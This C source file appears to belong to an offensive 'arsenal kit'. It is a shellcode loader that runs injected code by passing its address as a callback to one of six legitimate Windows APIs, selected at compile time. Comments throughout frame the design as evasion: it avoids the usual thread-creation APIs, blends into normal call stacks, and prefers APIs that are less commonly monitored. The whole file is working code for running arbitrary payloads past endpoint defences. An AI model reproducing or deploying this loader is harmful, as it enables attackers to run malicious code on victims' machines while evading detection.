/*
 * Starburst Arsenal Kit - Callback-Based Execution Bypass
 *
 * Executes shellcode by passing its address as a callback function
 * pointer to a legitimate Windows API.  The API invokes the callback
 * as part of its normal operation, so the execution flow looks like
 * standard Windows callback processing.
 *
 * Multiple callback methods are provided; uncomment the desired
 * method or set CALLBACK_METHOD at compile time.
 *
 * OPSEC:
 *   - Execution via legitimate Windows API callback mechanism.
 *   - Blends with normal API usage in call stacks.
 *   - No CreateThread, CreateRemoteThread, or APC APIs.
 *   - Memory transitions RW -> RX (no RWX).
 *
 * Build: compiled alongside a main_*.c wrapper (see main_exe.c).
 *
 * Compile-time selection:
 *   -DCALLBACK_METHOD=1   EnumWindows          (default)
 *   -DCALLBACK_METHOD=2   EnumChildWindows
 *   -DCALLBACK_METHOD=3   CreateTimerQueueTimer
 *   -DCALLBACK_METHOD=4   EnumFonts
 *   -DCALLBACK_METHOD=5   EnumDesktopWindows
 *   -DCALLBACK_METHOD=6   CertEnumSystemStore
 */

#include <windows.h>

#ifndef CALLBACK_METHOD
#define CALLBACK_METHOD 1
#endif

/* --------------------------------------------------------------------
 * Prepare executable memory from raw shellcode
 * Returns a pointer to RX memory, or NULL on failure.
 * ------------------------------------------------------------------ */
static LPVOID prepare_exec_mem(unsigned char *shellcode, unsigned int shellcode_len)
{
    LPVOID exec_mem;
    DWORD  oldProtect;

    exec_mem = VirtualAlloc(NULL, shellcode_len, MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);
    if (!exec_mem)
        return NULL;

    memcpy(exec_mem, shellcode, shellcode_len);

    if (!VirtualProtect(exec_mem, shellcode_len, PAGE_EXECUTE_READ, &oldProtect))
    {
        VirtualFree(exec_mem, 0, MEM_RELEASE);
        return NULL;
    }

    return exec_mem;
}

/* ====================================================================
 * Method 1: EnumWindows
 *
 * BOOL EnumWindows(WNDENUMPROC lpEnumFunc, LPARAM lParam);
 *
 * The callback is invoked for every top-level window.  Shellcode
 * runs on the first invocation; the return value is irrelevant
 * because shellcode typically does not return.
 * ==================================================================== */
#if CALLBACK_METHOD == 1

void execute_shellcode(unsigned char *shellcode, unsigned int shellcode_len)
{
    LPVOID exec_mem;

    if (!shellcode || shellcode_len == 0)
        return;

    exec_mem = prepare_exec_mem(shellcode, shellcode_len);
    if (!exec_mem)
        return;

    EnumWindows((WNDENUMPROC)exec_mem, 0);

    VirtualFree(exec_mem, 0, MEM_RELEASE);
}

#endif /* CALLBACK_METHOD == 1 */

/* ====================================================================
 * Method 2: EnumChildWindows
 *
 * BOOL EnumChildWindows(HWND hWndParent, WNDENUMPROC lpEnumFunc, LPARAM lParam);
 *
 * Same callback signature as EnumWindows but operates on child windows
 * of the desktop, producing a different API call in the stack trace.
 * ==================================================================== */
#if CALLBACK_METHOD == 2

void execute_shellcode(unsigned char *shellcode, unsigned int shellcode_len)
{
    LPVOID exec_mem;

    if (!shellcode || shellcode_len == 0)
        return;

    exec_mem = prepare_exec_mem(shellcode, shellcode_len);
    if (!exec_mem)
        return;

    EnumChildWindows(GetDesktopWindow(), (WNDENUMPROC)exec_mem, 0);

    VirtualFree(exec_mem, 0, MEM_RELEASE);
}

#endif /* CALLBACK_METHOD == 2 */

/* ====================================================================
 * Method 3: CreateTimerQueueTimer
 *
 * BOOL CreateTimerQueueTimer(PHANDLE phNewTimer, HANDLE TimerQueue,
 *      WAITORTIMERCALLBACK Callback, PVOID Parameter,
 *      DWORD DueTime, DWORD Period, ULONG Flags);
 *
 * Fires the callback after DueTime ms.  Setting DueTime=0 and
 * Period=0 triggers a single immediate invocation.  The
 * WT_EXECUTEINTIMERTHREAD flag runs the callback in the timer
 * thread rather than a new worker thread.
 * ==================================================================== */
#if CALLBACK_METHOD == 3

void execute_shellcode(unsigned char *shellcode, unsigned int shellcode_len)
{
    LPVOID exec_mem;
    HANDLE hTimer      = NULL;
    HANDLE hTimerQueue = NULL;

    if (!shellcode || shellcode_len == 0)
        return;

    exec_mem = prepare_exec_mem(shellcode, shellcode_len);
    if (!exec_mem)
        return;

    hTimerQueue = CreateTimerQueue();
    if (!hTimerQueue)
    {
        VirtualFree(exec_mem, 0, MEM_RELEASE);
        return;
    }

    CreateTimerQueueTimer(
        &hTimer,
        hTimerQueue,
        (WAITORTIMERCALLBACK)exec_mem,
        NULL,
        0,       /* DueTime: immediate */
        0,       /* Period:  one-shot   */
        WT_EXECUTEINTIMERTHREAD
    );

    /* Wait for the callback to execute */
    Sleep(500);

    /* Clean up -- DeleteTimerQueueEx with INVALID_HANDLE_VALUE waits
     * for all callbacks to complete before returning.                */
    DeleteTimerQueueEx(hTimerQueue, INVALID_HANDLE_VALUE);

    VirtualFree(exec_mem, 0, MEM_RELEASE);
}

#endif /* CALLBACK_METHOD == 3 */

/* ====================================================================
 * Method 4: EnumFonts
 *
 * int EnumFonts(HDC hdc, LPCSTR lpFaceName,
 *               FONTENUMPROCA lpFontFunc, LPARAM lParam);
 *
 * Enumerates fonts and calls the callback for each one.
 * Uses the screen DC; no window handle required.
 * ==================================================================== */
#if CALLBACK_METHOD == 4

void execute_shellcode(unsigned char *shellcode, unsigned int shellcode_len)
{
    LPVOID exec_mem;
    HDC    hdc;

    if (!shellcode || shellcode_len == 0)
        return;

    exec_mem = prepare_exec_mem(shellcode, shellcode_len);
    if (!exec_mem)
        return;

    hdc = GetDC(NULL);
    if (hdc)
    {
        EnumFontsA(hdc, NULL, (FONTENUMPROCA)exec_mem, 0);
        ReleaseDC(NULL, hdc);
    }

    VirtualFree(exec_mem, 0, MEM_RELEASE);
}

#endif /* CALLBACK_METHOD == 4 */

/* ====================================================================
 * Method 5: EnumDesktopWindows
 *
 * BOOL EnumDesktopWindows(HDESK hDesktop, WNDENUMPROC lpfn, LPARAM lParam);
 *
 * Enumerates all windows on the current desktop.  Passing NULL for
 * hDesktop uses the calling thread's desktop.
 * ==================================================================== */
#if CALLBACK_METHOD == 5

void execute_shellcode(unsigned char *shellcode, unsigned int shellcode_len)
{
    LPVOID exec_mem;

    if (!shellcode || shellcode_len == 0)
        return;

    exec_mem = prepare_exec_mem(shellcode, shellcode_len);
    if (!exec_mem)
        return;

    EnumDesktopWindows(NULL, (WNDENUMPROC)exec_mem, 0);

    VirtualFree(exec_mem, 0, MEM_RELEASE);
}

#endif /* CALLBACK_METHOD == 5 */

/* ====================================================================
 * Method 6: CertEnumSystemStore
 *
 * BOOL CertEnumSystemStore(DWORD dwFlags, void *pvSystemStoreLocationPara,
 *      void *pvArg, PFN_CERT_ENUM_SYSTEM_STORE pfnEnum);
 *
 * Enumerates certificate system stores.  Less commonly monitored
 * than window/font enumeration APIs.
 * ==================================================================== */
#if CALLBACK_METHOD == 6

#include <wincrypt.h>
#pragma comment(lib, "crypt32.lib")

void execute_shellcode(unsigned char *shellcode, unsigned int shellcode_len)
{
    LPVOID exec_mem;

    if (!shellcode || shellcode_len == 0)
        return;

    exec_mem = prepare_exec_mem(shellcode, shellcode_len);
    if (!exec_mem)
        return;

    CertEnumSystemStore(
        CERT_SYSTEM_STORE_CURRENT_USER,
        NULL,
        NULL,
        (PFN_CERT_ENUM_SYSTEM_STORE)exec_mem
    );

    VirtualFree(exec_mem, 0, MEM_RELEASE);
}

#endif /* CALLBACK_METHOD == 6 */
